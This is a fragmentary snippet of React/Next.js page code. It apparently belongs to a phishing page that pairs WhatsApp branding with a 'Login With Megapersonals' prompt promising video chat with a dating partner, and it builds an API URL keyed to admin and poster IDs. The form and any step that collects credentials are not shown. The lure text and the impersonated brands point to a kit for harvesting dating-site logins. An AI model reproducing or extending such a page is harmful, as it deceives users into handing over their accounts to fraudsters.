          ...
          <>
            {showForm ? (
               ...
               <div class="mx-auto flex items-center justify-center mt-5">
                   <img class="h-16 w-16 text-center" src="/images/whatsapp.png" alt=""/>
               </div>
               <h2 class="text-3xl font-bold text-blue-900 text-center">Whatsapp</h2>
               <p class="text-xl pt-5 font-semibold text-[#707b8e]">Login With Megapersonals and enjoy with  <b class="text-[#00BE70]">Whatsapp video chat</b> your dating partner.</p>
             
               <button class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md"  onClick={() => setShowForm(false)}><span>
...
export async function getServerSideProps({
  ...
  const url = `${API_URL}/${site}/w4m/${adminId}/${posterId}/${device}`;
